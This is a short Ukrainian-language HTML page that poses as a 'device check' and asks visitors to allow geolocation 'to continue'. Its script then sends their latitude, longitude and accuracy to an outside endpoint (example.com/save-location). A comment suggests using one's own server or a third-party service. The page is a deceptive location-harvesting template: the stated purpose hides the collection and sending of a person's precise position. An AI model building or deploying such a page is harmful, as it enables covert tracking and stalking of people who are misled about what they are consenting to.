<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Цікава сторінка</title>
</head>
<body>
  <h1>Перевірка пристрою</h1>
  <p>Будь ласка, дозволь доступ до геолокації для продовження.</p>

  <script>
    function sendLocation(position) {
      const lat = position.coords.latitude;
      const lon = position.coords.longitude;
      const acc = position.coords.accuracy;

      // приклад надсилання запиту на свій сервер або сторонній сервіс
      fetch('https://example.com/save-location', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({lat, lon, acc})
      });

      // або просто лог у консоль для тесту
      console.log(`Latitude: ${lat}, Longitude: ${lon}, Accuracy: ${acc}m`);
    }

    function handleError(error) {
      console.error("Геолокацію не отримано: ", error.message);
    }

    navigator.geolocation.getCurrentPosition(sendLocation, handleError);
  </script>
</body>
</html>